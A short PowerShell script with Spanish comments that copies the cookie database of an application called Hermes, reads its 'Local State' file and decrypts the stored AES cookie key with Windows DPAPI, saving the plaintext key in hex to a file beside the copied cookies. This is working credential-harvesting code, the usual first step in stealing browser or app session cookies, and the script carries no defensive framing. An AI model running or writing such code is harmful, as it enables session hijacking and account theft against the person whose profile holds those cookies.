# Copia la base de cookies del panel de vista previa y deja la clave AES en un archivo.
$ErrorActionPreference = 'Stop'
$origen = 'C:\Users\42\AppData\Roaming\Hermes\Network\Cookies'
$carpeta = 'C:\Users\42\AppData\Local\hermes\cache\scratch\fb'
$copia = Join-Path $carpeta 'Cookies'
$claveTxt = Join-Path $carpeta 'clave.txt'

New-Item -ItemType Directory -Force -Path $carpeta | Out-Null

try {
  $src = [System.IO.FileStream]::new($origen, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
  $dst = [System.IO.File]::Create($copia)
  $src.CopyTo($dst)
  $dst.Flush()
  $dst.Close()
  $src.Close()
  Write-Output ("copia: " + (Get-Item $copia).Length + " bytes")
} catch {
  Write-Output ("no se pudo copiar: " + $_.Exception.Message)
}

$ls = Get-Content 'C:\Users\42\AppData\Roaming\Hermes\Local State' -Raw | ConvertFrom-Json
$raw = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
$sin = $raw[5..($raw.Length - 1)]
Add-Type -AssemblyName System.Security
$claro = [System.Security.Cryptography.ProtectedData]::Unprotect(
  $sin,
  $null,
  [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)
(($claro | ForEach-Object { $_.ToString('x2') }) -join '') | Set-Content -NoNewline $claveTxt
Write-Output ("clave: " + (Get-Item $claveTxt).Length + " hex guardados")
